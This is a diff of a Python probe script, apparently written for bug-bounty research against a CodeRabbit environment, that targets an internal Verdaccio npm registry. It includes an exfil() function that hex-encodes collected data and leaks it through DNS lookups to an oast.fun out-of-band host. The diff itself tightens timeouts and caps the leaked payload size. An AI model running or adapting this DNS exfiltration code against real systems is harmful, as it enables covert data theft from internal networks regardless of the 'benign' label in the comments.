@@ -1,12 +1,13 @@
 # Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
 # Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
 import os, json, base64, hashlib, socket, re, io, tarfile, urllib.request, urllib.error
+socket.setdefaulttimeout(3)
 
 R = os.environ.get('NPM_CONFIG_REGISTRY', 'http://10.64.0.28:4873').rstrip('/')
 OAST = os.environ.get('CR_PROBE_OAST', 'dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun')
 OUT = {}
 
-def http(method, url, data=None, headers=None, timeout=8):
+def http(method, url, data=None, headers=None, timeout=4):
     req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as r:
@@ -17,9 +18,10 @@ def http(method, url, data=None, headers=None, timeout=8):
         return -1, str(e).encode()
 
 def exfil(obj):
-    s = json.dumps(obj, separators=(',', ':'))[:1800]
+    s = json.dumps(obj, separators=(',', ':'))[:300]
     h = s.encode().hex()
     for i in range(0, len(h), 48):
+        if i > 288: break
         try:
             socket.gethostbyname('r2-%03d-%s.%s' % (i // 48, h[i:i+48], OAST))
         except Exception:
